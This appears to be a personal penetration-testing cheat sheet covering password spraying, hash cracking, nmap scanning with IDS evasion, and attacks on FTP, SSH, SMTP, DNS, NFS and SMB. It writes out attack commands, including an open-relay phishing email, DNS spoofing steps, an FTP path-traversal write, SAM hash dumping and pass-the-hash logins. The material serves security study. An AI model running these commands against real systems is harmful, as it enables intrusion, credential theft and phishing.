# Authentication

## Password Spraying

- **Tools**

  - Web        -> FFUF / Burpsuite Intruder / Patator
  - Network -> Hydra / NXC / Legba

- **Weak Credentials**

  - Default

    - `searchpass [app/service]`
    - `/usr/share/seclists/Passwords/Default-Credentials` -> Services
    - Default Usernames
      - Linux       -> `root`
      - Windows -> `Guest` / `Adminsitrator`
      - Web         -> `admin` / `administrator`

  - User = Password

    ```bash
    nxc [SERVICE] [IP] -u [USER.txt] -p [USER.txt] --no-bruteforce
    ```

    `--no-bruteforce` to go line by line

  - Re-Used (also local auth)

### Wordlist Generation

- All **combinations** for a given charset

  - ```bash
    crunch <min_lenght> <max_lenght> <char_set> | tee wd.txt
    ```

  - ```bash
    hydra -x <min_lenght>:<max_lenght>:<CHAR_SET>
    ```

- **Web** Applications    -> `pswgen [WEB_URL]`

- **Usernames**

  - `usergen() [FULL_NAMES.txt]`

  - Wordlists:
    - [Statistically Likely](https://github.com/insidetrust/statistically-likely-usernames) 
    - `/usr/share/seclists/Usernames`  (Xato-Net / CIRT / `Names.txt`)

  - Services though which usernames can be bruteforced
    - SMTP / [OpenSSH < 7.7](https://github.com/Sait-Nuri/CVE-2018-15473) / Kerberos / [Solaris FTP](https://github.com/pentestmonkey/ftp-user-enum/blob/master/ftp-user-enum.pl) / Ident / Finger
    - Web Login Responses (if in the response you get 'user doesn't exist)

- **Passwords**

  - `cupp -i`: insert info about a victim to generate a password list

  - Wordlists: `/usr/share/seclists/Passwords`

    Xato-Net / CIRT / Probable-V2 / Darkweb2017 / Rockyou

### Wordlist Mutation

- Hashcat Mangling

  - `/usr/share/hashcat/rules` -> Best64 / LeetSpeak / [Clem9669 Rules](https://github.com/clem9669/hashcat-rule/tree/master)
  - `hashcat --stdout --rules-file [RULE_FILE] [PASS.txt] > [OUT]`

- Manually Change  -> Dates / ID Values / Timestamps 

- Password Policy    -> Character & Length Filtering

- [LDAP Harvesting](https://github.com/p0dalirius/pyLDAPWordlistHarvester?tab=readme-ov-file)   -> Requires valid LDAP Credentials

- Shell:

  ```bash
  grep -E <regex> wd.txt > wd.txt
  ```

  - Minimum Lenght `'^.{8,}$'`

  - At least one upper-case: `'[A-Z]'`
  
  - At least 2 special char: `'([!@#$%^&*].*){2,}'`

### Brute Forcing

- Usernames

  - `usergen() [FULL_NAMES.txt]`
  - Wordlists:
    - [Statistically Likely](https://github.com/insidetrust/statistically-likely-usernames) 
    - `/usr/share/seclists/Usernames`  (Xato-Net / CIRT / `Names.txt`)
  - Services though which usernames can be bruteforced
    - SMTP / [OpenSSH < 7.7](https://github.com/Sait-Nuri/CVE-2018-15473) / Kerberos / [Solaris FTP](https://github.com/pentestmonkey/ftp-user-enum/blob/master/ftp-user-enum.pl) / Ident / Finger
    - Web Login Responses (if in the response you get 'user doesn't exist)

- Passwords

  - `cupp`: insert info about a victim to generate a password list

  - Wordlists: `/usr/share/seclists/Passwords`

    Xato-Net / CIRT / Probable-V2 / Darkweb2017 / Rockyou

#### Hydra

```bash
# LOGIN OPTIONS						# Attack Options
-l <user>							-t <n>		# Task count
-L <user.txt>						-w <n>		# delay between attempts
-p <pass>
-P <pass.txt>

# SERVICES
service://server -s <port>
-M targets.txt	# Multiple Ips 

# WEB
hydra [..] -f [IP] -s [PORT] http-get
hydra [..] http-post-form "/PATH:user=^USER^&pass=^PASS^:[FILTER]"
	# Filtering options:
	S=<success_condition>
	F=<failure_condition>	# Can be a status code or a word in the page
```

Supported services:

- `ftp` The flag for the passive mode: `-m "PASV"`
- `ssh`
- `smtp`
- `pop3`
- `imap`
- `mysql`
- `mssql`
- `vnc`
- `rdp`

## Encoding

- Burpsuite intruder

- [CyberChef](https://gchq.github.io/CyberChef/)

- Terminal encoding

  ```bash
  cat [FILE.txt] | while read line; do echo -n $line | base64 | tr -d '\n' | base16; done
  ```

  - `echo -n` avoids the newline
  - `tr -d '\n'` removes any newline characters from the input

**Whatch out for bad characters at the end!** *It could me something went wrong*

00, 0a, 0d, 90

## Hash Cracking

### Cracking methods

- Identification:

  - `hashid` 

  - [crackstation](https://crackstation.net/)

- john:

  ```bash
  john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --fork=15
  ```

- hashcat

  ```bash
  hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
  ```

- Files: johnthe ripper, use zip2john to convert it
  - `zip2john backup.zip > backup.hash`
  - `john backup.hash`

### Shadow Hashes

Shadow hashes are typically stored in `/etc/shadow` and look like this:

```basic
user:$6$randomsalt$hashedpassword:18323:0:99999:7::::
```

- `$6$`: Hashing algorithm (e.g., SHA-512).

- `randomsalt`: Salt to make the hash unique.

- `hashedpassword`: The actual hash.

Before cracking one has to unshadow, that is: 

```bash
unshadow /etc/passwd /etc/shadow > combined.txt
john combined.txt --wordlist=/usr/share/wordlists/rockyou.txt --fork=15
john --show combined.txt
```

# Network

## Enumeration

### Host Discovery

Given one or more IP addresses, we want to see which ones are alive:

Send ICMP echo requests, and see if they reply with `nmap`

```bash
sudo nmap [IP] -sn | grep for | cut -d" " -f5
```

This scanning method works only if the firewalls of the hosts allow it.

- IP format:

  - range  `nmap [IP_start/IP_end]`

  - host list: `nmap -iL FILE`
  - multiple IPs [IP1] [IP2] ...
- `-PE`:  Perform only *ICMP* ping scan. 
- `--reason` Displays why an host is alive
- `--packet-trace` Shows all packages sent and received

### Service scanning

The **TCP-SYN scan** (`-sS`), the default nmap scan, sends one packet with the  SYN flag and, therefore, never completes the three-way handshake. 

#### **nmap options:**

- **General:**

  - `-sC` execute scripts

  - `-sV` show the versions

  - `--version-all` (Try every single probe to determine the version)   

  - `--disable-arp-ping`: Disables ARP requests, so the scan doesn't switch to ARP requests when scanning local networks.

  - `-Pn` disable the ICMP echo requests 

  - `-n` disable DNS resolution

  - `-A` aggressive scan

  - `--packet-trace` Shows all packages sent and received

  - `--version-trace` Show all version packages       


- **protocols:**

  - `-sU` performs UDP scan
  - `-sS` SYN Scan: default
  - `-sT` Connect scan: sends a  `SYN` packet -> the port is open if it answers with  `SYN-ACK` packet and closed with an `RST` packet. 
    - Less stealthy and slow than `-sS`, but highly accurate.
    - Useful when the target has a firewall that drops incoming packets but allows outgoing packets. 

  - `-sA` ACK scan: much harder to filter for firewalls and IDS/IPS systems because they only send a TCP packet with only the ACK flag. 

  - `-O`: Performs operation system detection scan.

- **Firewall / IDS usuful flags:**

  - change protocol
  - `-D RND:5` Generates five random IP addresses that indicates the source IP the connection comes from.
  - `-S` Scans the target by using different source IP address.
  - `-e [INTERFACE]` Sends all requests through the specified interface.
  - `--dns-server <ns>,<ns>`) to specify DNS servers. 
  - `--source-port 53` specify a source port  for our scans. 
  - `-T` specifies the timeing (`0` paranoid - `5` insane)

- `nmap --script <script name> -p <port> <host>` to run other scripts.

  `--script "dns-* and discovery and not intrusive"` uses all the dns related scripts in the category discovery and not in the category intrusive. Here all the categories:

  - `auth` Determination of authentication credentials.
  - `broadcast` Scripts, which are used for host discovery by broadcasting and the discovered hosts, can be automatically added to the remaining scans.
  - `brute` Executes scripts that try to log in to the respective service by brute-forcing with credentials.
  - `default` Default scripts executed by using the -sC option.
  - `discovery` Evaluation of accessible services.
  - `dos` These scripts are used to check services for denial of service vulnerabilities and are used less as it harms the services.
  - `exploit` This category of scripts tries to exploit known vulnerabilities for the scanned port.
  - `external` Scripts that use external services for further processing.
  - `fuzzer` This uses scripts to identify vulnerabilities and unexpected packet handling by sending different fields, which can take much time.
  - `intrusive` Intrusive scripts that could negatively affect the target system.
  - `malware` Checks if some malware infects the target system.
  - `safe` Defensive scripts that do not perform intrusive and destructive access.
  - `version` Extension for service detection.
  - `vuln` Identification of specific vulnerabilities.

#### **nmap output**

- **`open`:** Connection to the scanned port has been established (TCP, UDP or SCTP) 

  - If the UDP port is `open`, we only get a response if the application is configured to do so.

- **`closed`:** 

  - For TCP, we got back a `RST` flag. 
  - In UDP, only if we get an ICMP response with `error code 3` (port unreachable), we know that the port is indeed closed, otherwise is unreliable.

- **`filtered`:** Nmap cannot say if the port is open/closed, because:

  - the package was *dropped*: Nmap receives no response, and by default will resend the request, by setting the retry rate (`--max-retries`) to 10. 
  - A *firewall* reject the package: As a response, we could get one of the following error messages:
    - Net Unreachable
    - Net Prohibited
    - Host Unreachable
    - Host Prohibited
    - Port Unreachable
    - Proto Unreachable

- **`unfiltered`:** either *no response is returned* or an error code* is returned.

- **`open|filtered`:** a firewall or packet filter may protect the port.

  - In UDP scan if the ICMP response was neither open nor closed, it will be marked as `open|filtered`.

- **`closed|filtered`:** impossible to determine if the scanned port is closed or filtered by a firewall.

- **`tcpwrapped`** the behavior of the port is consistent with one that is  protected by tcpwrapper, that is a full TCP  handshake was completed, but the remote host closed the connection  without receiving any data. 

  tcpwrapper protects *programs*, not ports. This means that a valid (not false-positive) `tcpwrapped` response indicates a real network service is available, but you are not on the list of hosts allowed to talk with it. When such a large number  of ports are shown as `tcpwrapped`, it is unlikely that they represent real services, so the behavior probably means something else.

**Firewalls and IDS/IPS**

Like firewalls, the intrusion detection system (`IDS`) and intrusion prevention system (`IPS`) are also software-based components. `IDS` scans the network for potential attacks, analyzes them, and reports any detected attacks. `IPS` complements `IDS` by taking specific defensive measures if an attack is detected, such as blocking the attacker's IP. Thus, from an attacker perspective, firewalls and IDS can be treated in the same way.

Here some way to deal with them:

- Change scanning protocol

- Change rate limit and intensity. If this isn't improving the results, then it means that it is a firewall and not a IPS, with `-T` and `--version-all`.

- Decoys:
  With the option `-D`,  Nmap generates various random IP addresses inserted into the IP header to disguise the origin of the packet sent, e.g. `-D RND:5` it sends 5 random ones.

- IP ID manipulation: 

  There could be situations where only certain **subnets** are restricted from accessing specific services on a server. 

  In these cases, you might want to **manually specify a different source IP address** (using the `-S` and  `-e [interface (e.g. tun0)]` options ) from the ones in `ifconfig` to see if a different IP address (perhaps from a different subnet) gets better results.

- DNS Proxying

  - `--dns-server <ns>` to specify DNS servers, e.g. `1.1.1.1`. This method could be fundamental if we are in a demilitarized zone (`DMZ`). The company's DNS servers are usually more trusted than those from the  Internet. 

  - `--source-port 53` specifies the source port. If the administrator uses the firewall to control this  port and does not filter IDS/IPS properly, our TCP packets will be  trusted and passed through.

- If the firewall accepts `TCP port 53`, it is very likely that IDS/IPS filters might also be configured much  weaker than others. We can test this by trying to connect to this port  by using `Netcat`.

### Version Fingerprinting

- **Banner grabbing** 

  Often a service will look to identify itself by displaying a banner once connectioned

  - `-sV` and `--version-all` it is usually enough

  - `nmap -sV --script=banner <target>` 

  - manually: connect to the SMTP server using `nc`, grab the banner, and intercept the network traffic using `tcpdump`

    ```bash
    sudo tcpdump -i [eth0/tun0] host [YOUR_IP] and [IP_TO_LISTEN]
    ```

    ```bash
    sudo ncat -v [IP] [PORT] {--source-port }
    ```

    add `--udp` if the port you want to connect to with netcat is upd.
    Note that if netcat times out, then you should just try more times.

- **SNMP (Simple Network Management Protocol) :** string that provide information and statistics about a router or device

  - v1, v2:  everything is send in the clear
  - v3: security measure, encryption and authentication
  - [onesixtyone](https://github.com/trailofbits/onesixtyone) can be used to brute force the community string names using a dictionary file of common community strings such as the `dict.txt` file included in the GitHub repo for the tool.

## Service Hacking

### Service Types

**Services:**

- Authentication protocols (ssh, telnet, rdp, smb, vnc) → Find the credentials
- Read/Write (redis, ftp, tftp, smb, nfs, rsync, snmp, rpc, netbios, ldap)
- Database (redis, mysql, mssql, psql, mongodb, oracle-tns, whois)
- Network Access (squid, isakmp, irc, dns)
- E-mail (smtp, pop3, imap)

**Stacks (common ports)**

- 135, 139, 445 -> SMB
- 80, 8080, 8000, 8443, 3000 -> HTTP
- 88, 389, 5985 -> Active Directory
- 21, 2121 -> FTP
- 22, 2222 -> SSH
- 1433, 3306, 5432, 27017 -> DB: MsSQLS, MySQL, PSQL, Mongo

### 21 - FTP

#### Generalities:

**Type:** Authentication, Read/Write

- Protocol:

  In an FTP connection, two channels are opened. First, the client and server establish a control channel through `TCP port 21`. The client sends commands to the server, and the server returns status  codes. Then both communication participants can establish the data  channel via `TCP port 20`. This channel is used exclusively  for data transmission, and the protocol watches for errors during this  process. If a connection is broken off during transmission, the  transport can be resumed after re-established contact.

- Active vs Passive mode:

  In the `active` variant, the client establishes the connection as  described via TCP port 21 and thus informs the server via which  client-side port the server can transmit its responses. However, if a  firewall protects the client, the server cannot reply because all  external connections are blocked. 

  For this purpose, the `passive mode` has been developed. Here, the server announces a port through which the client can establish the data channel. Since the client initiates the  connection in this method, the firewall does not block the transfer.

- [List of FTP return codes](https://en.wikipedia.org/wiki/List_of_FTP_server_return_codes)

#### Interaction:

- `ftp [IP] -P [PORT]`

  - `cd`, `ls -la` , to navigate
  - `get` `put` to download/upload
  - `status` to check the settings
  - `LIST -R`, if the setting ls_recurse_enable=YES, this show all the content at once.
  - `debug`
  - `trace`

- Download all available files:

  ```bash
  wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136
  ```

- If TLS/SSl encryption is present, to get the certificate:

  ```bash
  openssl s_client -connect [IP] -starttls ftp
  ```

  This will also show the SSL certificate

- netcat/telnet

#### Exploit:

- File upload
  - LFI
  - with web servers, it is common that files are synchronized

- sniffing with tcpdump 

- Bounce attack

  It is a way to get nmap access a local server (that you cannot scan with nmap) through an exposed ftp server

  ```bash
  nmap -Pn -v -n -p80 -b [user]:[pass]@[EXPOSED SERVER] [LOCAL SERVER]
  ```

- CoreFTP 

  Allows an HTTP `PUT` request, which we can use to write content to files. 

  ```bash
  curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
  ```

**vsFTPd Configuration**

- The default configuration of vsFTPd can be found in `/etc/vsftpd.conf`
- Possible settings: [man page](http://vsftpd.beasts.org/vsftpd_conf.html).
- `/etc/ftpusers` is used to deny certain users access to the FTP service.

### 23 - Telnet

It is a shell (old ssh)

-  nmap is enough for enumeration
- hydra to bruteforce
- To connect: `telnet [IP]`

### 22 - SSH

#### Generalities

- **Type:** authentication

- Authentication protocol:

  1. Server Authentication:

     The server sends an encrypted certificate to the client 

  2. Client authentication:

     The client enters a password, which was saved as an encrypted hash by the server

- Authentication methods:

  - Password authentication

  - Public-key authentication

    The private key is stored on the user's own computer and secured with a passphrase. 

    PUTTY is Windows format, that can be converted in Linux with:

    `puttygen ssh_key_file -O private-openssh -o id_rsa`

  - Host-based authentication

  - Keyboard authentication
  
  - Challenge-response authentication
  
  - GSSAPI authentication

#### Configuration

The [sshd_config](https://www.ssh.com/academy/ssh/sshd_config) file is in `/etc/ssh/sshd_config`

**Dangerous settings**

| **Setting**                  | **Description**                                              |
| ---------------------------- | ------------------------------------------------------------ |
| `PasswordAuthentication yes` | Allows password-based authentication. Allows to brute-force a known username for possible passwords. |
| `PermitEmptyPasswords yes`   | Allows the use of empty passwords.                           |
| `PermitRootLogin yes`        | Allows to log in as the root user.                           |
| `Protocol 1`                 | Uses an outdated version of encryption.                      |
| `X11Forwarding yes`          | Allows X11 forwarding for GUI applications.                  |
| `AllowTcpForwarding yes`     | Allows forwarding of TCP ports.                              |
| `PermitTunnel`               | Allows tunneling.                                            |
| `DebianBanner yes`           | Displays a specific banner when logging in.                  |

#### Exploit

-  `SSH-1` is vulnerable to `MITM` attacks

#### Interaction

````bash
./ssh-audit.py [IP]
````

For potential brute-force attacks, we can specify the authentication method with the SSH client option `PreferredAuthentications`.

```bash
ssh -v [USER]@[IP] -o PreferredAuthentications=[PASSWD]
```

- version

  By default, the banners start with the version of the protocol that can  be applied and then the version of the server itself. For example, with `SSH-1.99-OpenSSH_3.9p1`, we know that we can use both protocol versions SSH-1 and SSH-2, and we  are dealing with OpenSSH server version 3.9p1. On the other hand, for a  banner with `SSH-2.0-OpenSSH_8.2p1`, we are dealing with an OpenSSH version 8.2p1 which only accepts the SSH-2 protocol version.

### 25, 465, 587 - SMTP

#### Generalities:

**Type: ** Email sending

- Purpose:

  - Sends emails in an IP network, often combined with the IMAP or POP3 protocols, which can fetch emails and send emails.
  - Prevents spam using authentication mechanisms that allow only authorized users to send e-mails.

- Used with SSL/TLS encryption.

- Protocol:

  ![image-20241104144603042](/home/damuna/.config/Typora/typora-user-images/image-20241104144603042.png)

  1.  Authentication
  2.  After sending his e-mail, the SMTP client, disassembles it into a header and a body and uploads both to the SMTP server.
  3.  Sometimes there is a *Mail Submission Agent* (`MSA`), or *Relay Server*, which checks the validity, i.e., the origin of the e-mail. 
  4.  The *Mail Transfer Agent* (`MTA`), the software basis for sending and receiving e-mails, checks the e-mail for size and spam and then stores it. 
  5.  Email is reassembled.
  6.  The *Mail Delivery Agent* (`MDA`) transfers it to the recipient's mailbox.

- Downsides:

  - No usable delivery confirmation: only an English-language error message, including the header of the undelivered message, is returned.

  - Users are not authenticated when a connection is established, and the sender of an email is therefore unreliable. 

    As a result, open SMTP relays are often misused to send spam en masse. The originators use arbitrary fake sender addresses for this purpose to not be traced (mail spoofing). 

  - For this purpose, an extension for SMTP has been developed called `Extended SMTP` (`ESMTP`). When people talk about SMTP in general, they usually mean ESMTP.

#### Configuration

- `/etc/postfix/main.cf | grep -v "#" | sed -r "/^\s*$/d"`

- Dangereous settings:

  - Open Relay Configuration

    `mynetworks = 0.0.0.0/0`

    With this setting, this SMTP server can send fake emails and thus  initialize communication between multiple parties. Another attack  possibility would be to spoof the email and read it.

#### Interaction

- `telnet` list of response code [here](https://serversmtp.com/smtp-error/)

  - `AUTH PLAIN`  authenticate the client.
  - `HELO`  logs in with its computer name and thus starts the session.
  - `MAIL FROM`  names the email sender.
  - `RCPT TO`  names the email recipient.
  - `DATA`  initiates the transmission of the email.
  - `RSET`  aborts the initiated transmission but keeps the connection between client and server.
  - `VRFY`  checks if a mailbox is available for message transfer, can enumerate existing users on the system
  - `EXPN`  checks if a mailbox is available for messaging with this command. When used with a distribution list, it will list all users on that list.
  - `NOOP`  equests a response from the server to prevent disconnection due to time-out.
  - `QUIT`  terminates the session.

- ```bash
  telnet <ip> <port>
  # Basic interactions
  HELO <domain>
  EHLO <domain>
  VRFY root
  VRFY testuser
  # Sometimes we may have to work through a web proxy. 
  CONNECT <ip>:<port> HTTP/1.0
  # Send an email
  MAIL FROM: <[USER]@[DOMAIN]>
  RCPT TO: <[USER]@[DOMAIN]> NOTIFY=success,failure
  DATA
  ```

- `evolution` (GNOME Desktop)

- **User enumeration**

  ```bash
  smtp-user-enum -M <method VRFY, EXPN, RCPT > -u <WORDLISRT> -t <ip> -D dom
  ```

​	To try with domain usually only for RCPT.

#### Exploit

- **Open Relay** -> Phishing or spoofing

  Messaging servers that are accidentally or intentionally configured as  open relays allow mail from any source to be transparently re-routed  through the open relay server.

  1. `nmap smtp-open-relay` tests if an open relay is possible.

  2. Use any mail client to connect to the mail server and send our email.

     ```bash
     swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213
     ```

### 53 - DNS

#### Generalities:

- Purpose:

  - DNS servers translate domain names into IP addresses and thus control which server a user can reach via a  particular domain. 
  - It stores and outputs additional information about the services associated with a domain.

- Encryption:

  DNS is mainly unencrypted. By  default, IT security professionals apply `DNS over TLS` (`DoT`) or `DNS over HTTPS` (`DoH`) here. In addition, the network protocol `DNSCrypt` also encrypts the traffic between the computer and the name server.

- Types of DNS Servers:

  - *DNS root server*

    responsible for the top-level domains (`TLD`). As the last instance, they are only requested if the name server does not respond. 

  - *Authoritative name server*

    hold authority for a particular zone. They only answer queries from their area of responsibility,

  - *Non-authoritative name server*

    they collect information on specific DNS zones

  - *Caching server*

    cache information from other name servers for a specified period. The  authoritative name server determines the duration of this storage.

  - *Forwarding server*

    forward DNS queries to another DNS server.

  - *Resolver*

    perform name resolution locally

- DNS records:

  - `A`  Returns an IPv4 address of the requested domain 
  - `AAAA`  Returns an IPv6 address of the requested domain.
  - `MX`  Returns the responsible mail servers 
  - `NS`  Returns the DNS servers (nameservers) of the domain.
  - `TXT`  Contains various information
  - `CNAME`  Serves as an alias for another domain name.
  - `PTR`  Converts IP addresses into valid domain names.
  - `SOA`  Provides information about the corresponding DNS zone and email address of the administrative contact.


**Configuration**

- *Local DNS configurations files*

  - [Bind9](https://www.isc.org/bind/) is often used on Linux
  - Different zones are defined here
  - The local conf files are usually:
    - `named.conf.local`
    - `named.conf.options`
    - `named.conf.log`
  - Dangerous settings:
    - `allow-query`  Defines which hosts are allowed to send requests to the DNS server.
    - `allow-recursion`  Defines which hosts are allowed to send recursive requests to the DNS server.
    - `allow-trnasfer`  Defines which hosts are allowed to receive zone transfers from the DNS server.
    - `zone-statistics`  Collects statistical data of zones.

- *zone files* `/etc/bind/db.domain.com`

  Text file that describes a DNS zone with the BIND file format. 

   There must be precisely one `SOA` record (usually at the beginning) and at least one `NS` record for a domain to have zones. 

- *reverse name resolution files* `/etc/bind/db.10.129.14`

  The computer name (FQDN) is assigned to the last octet of an IP address, which corresponds to the respective host, using a `PTR` record., which are responsible for the reverse translation of IP addresses into names.

#### Footprinting

- General info:

  ```bash
  # Name Servers
  dig ns [DOMAIN] @[IP]] {+short}
  # Version
  dig CH TXT version.bind [IP]
  # Available records
  dig ANY [DOMAIN] @[IP]
  ```

- **Zone Transfer**

  ```
dig axfr [DOMAIN] @[IP]
  ```

  This should be done recursively on the new discovered domains.
  
  A DNS zone is a portion of the DNS namespace that a specific organization or administrator manages. DNS servers utilize DNS zone transfers to copy a portion of their database to another DNS server. One can try asking a DNS server for a copy of its zone information.

- **SubDomain Brute Forcing**

  -  [DNSenum](https://github.com/fwaeytens/dnsenum)

    ```bash
    dnsenum --dnsserver [IP] --enum -p 0 -s 0 -o subdomains.txt -f [WORDLIST] [DOMAIN]
    ```

  - Subbrute (more precise but slower)

    ```bash
    cd TOOLS/subbrute
    ./subbrute.py [DOMAIN] -s ./names.txt -r ip.txt
    ```

#### Exploit

- **Domain Takeover** (only public)

  Registering a non-existent domain name to gain control over another domain.

  ```bash
  host [SUBDOMAIN]
  ```
  
  If the domain name uses a CNAME record to another domain, which expired. In that case, anyone who registers to it will have complete control over the domain, until the DNS record is updated.
  
  After finding one, one can check it [here](https://github.com/EdOverflow/can-i-take-over-xyz)

- **DNS Spoofing**

  Altering DNS records with false information so that they can be used to redirect online traffic to a fraudulent website. 

  1. Map in the `/etc/ettercap/etter.dns` file, the target domain to the attacker's IP
  2. Start `Ettercap` and scan for live hosts `Hosts > Scan for Hosts`. 
  3. Add the target IP address to Target1 and add a default gateway found in step 2. IP to Target2.
  4. Activate `dns_spoof` attack by navigating to `Plugins > Manage Plugins`.
  5. if a victim user coming from the target machine visits the domain on a web browser, they will be redirected to a `Fake page` that is hosted on the attacker's IP address.

### 69u - TFTP

**Type: ** Read/write

Like FTP, but without needing authentication.

```
tftp
>
```

| **Commands** | **Description**                                              |
| ------------ | ------------------------------------------------------------ |
| `connect`    | Sets the remote host, and optionally the port, for file transfers. |
| `get`        | Transfers a file or set of files from the remote host to the local host. |
| `put`        | Transfers a file or set of files from the local host onto the remote host. |
| `quit`       | Exits tftp.                                                  |
| `status`     | Shows the current status of tftp, including the current transfer  mode (ascii or binary), connection status, time-out value, and so on. |
| `verbose`    | Turns verbose mode, which displays additional information during file transfer, on or off. |

### 79 - Finger

**Finger** is a program you can use to find information about computer users. 

#### Enumeration

```bash
finger @<Victim>       #List users
finger admin@<Victim>  #Get info of user
finger user@<Victim>   #Get info of user
```

Bruteforcing finger can reveal local users

### 110, 995 - POP3

#### Generalities:

**Type:** Email receiving

- Purpose:
  - Access emails from a mail server
  - Allows online listing retrieving and deleting emails
  - Authentication to the desire mailbox
  - SSL/TLS to require an encrypted session (on the higher port if present)

#### Configuration

In the documentation of Dovecot, we can find the individual [core settings](https://doc.dovecot.org/settings/core/) and [service configuration](https://doc.dovecot.org/configuration_manual/service_configuration/) options.

By default, `POP3` clients remove downloaded messages from the email server, while `IMAP` doesn't making the latter one more interesting. 

**Dangerous Settings:**

| **Setting**               | **Description**                                              |
| ------------------------- | ------------------------------------------------------------ |
| `auth_debug`              | Enables all authentication debug logging.                    |
| `auth_debug_passwords`    | This setting adjusts log verbosity, the submitted passwords, and the scheme gets logged. |
| `auth_verbose`            | Logs unsuccessful authentication attempts and their reasons. |
| `auth_verbose_passwords`  | Passwords used for authentication are logged and can also be truncated. |
| `auth_anonymous_username` | This specifies the username to be used when logging in with the ANONYMOUS SASL mechanism. |

#### Interaction

- nmap will return the available commands that can be executed

- If we discover the credentials:

  ```bash
  curl -k 'pop3s://[IP]' --user user:password -v
  ```

  -  `verbose` (`-v`) we can see the version of TLS used for  encryption, further details of the SSL certificate, and even the banner, which could contain the version of the mail server.

- To connect via openssl:

  ```bash
  openssl s_client -connect [IP]:pop3s
  ```

| **Command**     | **Description**                                             |
| --------------- | ----------------------------------------------------------- |
| `USER username` | Identifies the user.                                        |
| `PASS password` | Authentication of the user using its password.              |
| `STAT`          | Requests the number of saved emails from the server.        |
| `LIST`          | Requests from the server the number and size of all emails. |
| `RETR id`       | Requests the server to deliver the requested email by ID.   |
| `DELE id`       | Requests the server to delete the requested email by ID.    |
| `CAPA`          | Requests the server to display the server capabilities.     |
| `RSET`          | Requests the server to reset the transmitted information.   |
| `QUIT`          | Closes the connection with the POP3 server.                 |

### 111 tu, Portmapper

 

### 111tu, 2049tu - NFS

#### Generalities:

**Type:** Reade/Write, Authentication only for v4

- Purpose:

  Access file systems over a network as if they were local and is used between Linux and Unix systems.

- Version 4 vs the previous:

  In version 3 of NFS, only the client computer (i.e., the machine trying to connect to the NFS server) needs to be authenticated. Once the client is authenticated, any user on that client machine has access based on the client’s access permissions, without further authentication. In version 4, NFS, individual users are authenticated rather than just the client machine. Also, only one UDP or TCP port `2049` is used to run the service, which simplifies the use of the protocol across firewalls.

- Protocol:

  NFS is based on the [Open Network Computing Remote Procedure Call](https://en.wikipedia.org/wiki/Sun_RPC) (`ONC-RPC`/`SUN-RPC`) protocol exposed on `TCP` and `UDP` ports `111`, which uses [External Data Representation](https://en.wikipedia.org/wiki/External_Data_Representation) (`XDR`) for the system-independent exchange of data. The NFS protocol has no mechanism for authentication or authorization. Instead, authentication is completely shifted to the RPC protocol's options. The most common authentication is via UNIX `UID`/`GID` and `group memberships`.

#### Configuration

- `/etc/exports`
  - The [NFS Exports Table](http://manpages.ubuntu.com/manpages/trusty/man5/exports.5.html) shows the possible options of the file
  - First, the folder is specified and made available to others, and then  the rights they will have on this NFS share are connected to a host or a subnet.
  - Possible options:
    - `rw`  Read and write permissions. 
      - Dangerous
    - `ro`  Read only permissions.
    - `sync`  Synchronous data transfer. (A bit slower)
    - `async`  Asynchronous data transfer. (A bit faster)
    - `secure`  Ports above 1024 will not be used.
    - `insecure`  Ports above 1024 will be used. 
      - Dangerous: users can use ports above 1024. The first 1024 ports can only be used by root. This prevents the fact that no users can use sockets above port 1024 for the NFS service and interact with it.
    - `no_subtree_check`  This option disables the checking of subdirectory trees.
    - `root_squash`  Assigns all permissions to files of root UID/GID 0 to the UID/GID of anonymous, which prevents `root` from accessing files on an NFS mount. 
      - Dangerous: if set, we cannot edit the `backup.sh` file even as root.
    - `nohide`  If another file system was mounted below an exported directory, this directory is exported by its own exports entry. 
      - Dangerous

#### Navigation

- Show available Shares that can be mouted

  ```bash
  showmount -e [IP]
  ```

- Mount a Share

  ```bash
  $ mkdir target-NFS
  $ sudo mount -t nfs [IP]:/ ./target-NFS/ -o nolock
  $ cd target-NFS
  $ tree .
  ```

- List Content with UIDs & GUIDs

  ```bash
  ls -n mnt/nfs/
  ```

- Unmount

  ```bash
  $ cd ..
  $ sudo umount ./target-NFS
  ```


#### Exploit:

- If we have access to the system via SSH and want to read files from another folder that a specific user can read, we would need to upload a shell to the NFS share that has the `SUID` of that user and then run the shell via the SSH user.



### 135 - WMI

#### Generalities:

- **Type:** Authentication (remote)
- Purpose:
  - Windows Management Instrumentation (`WMI`) allows read and write access to almost all settings on Windows systems. 

#### Interaction

- to log in use  [wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)

  ```
  /usr/share/doc/python3-impacket/examples/wmiexec.py [USER]:"[PASSWD]"@[IP] "hostname"
  ```

### 115 LPD Printer



### 135, 137-9, 445 - RPC, NetBIOS, SMB

#### Generalities:

**Type:** Read/Write, Authentication

- Purpose:

  - regulates access to files and entire directories and other network resources such as printers, routers, or interfaces released for the network. 
- Information exchange between different system processes 


  - The client can communicate with other  participants in the same network to access files or services shared with it on the network

  - provide arbitrary parts of its local file system as shares.


- Workgroups:

  In a network, each host participates in the same `workgroup`. A workgroup is a group name that identifies an arbitrary collection of computers and their resources on an SMB network.

#### Configuration

- `/etc/samba/smb.conf` to change settings
- Dangerous settings:
  - `browseable - yes`: Allow listing available shares in the current share

#### Interaction

- `netexec`

  ```bash
  # List shares
  nxc smb [IP] -u '' -p '' --shares	
  # Download downloadable files
  nxc smb [IP] -u '' -p '' -M spider_plus -o DOWNLOAD_FLAG=True
  # Get the password policy, if the Account Lockout Threshold is None brute forcing is possible
  nxc smb [IP] -u '' -p '' --pass-pol
  # Brute-forcing on the two possible login methods
  nxc smb -u [USER_LIST] -p [PASS_LIST] -d [DOMAIN]
  nxc smb -u [USER_LIST] -p [PASS_LIST] --local-auth	# Also hydra
  
  # ----------ACTIVE DIRECTORY----------
  
  # Run command (also on multiple hosts at the same time)
  nxc smb [IP] -u [USER] -p '[PASS]' -x 'whoami' --exec-method smbexec
  
  # Enumerating logged on Users
  nxc smb [IP] -u [USER] -p '[PASS]' --loggedon-users
  
  # Extract Hashes from SAM Database (administrative privileges)
  nxc smb [IP] -u [USER] -p '[PASS]' --sam
  
  # Log in with NTLM hashed password
  nxc smb [IP] -u [USER] -H [HASH]
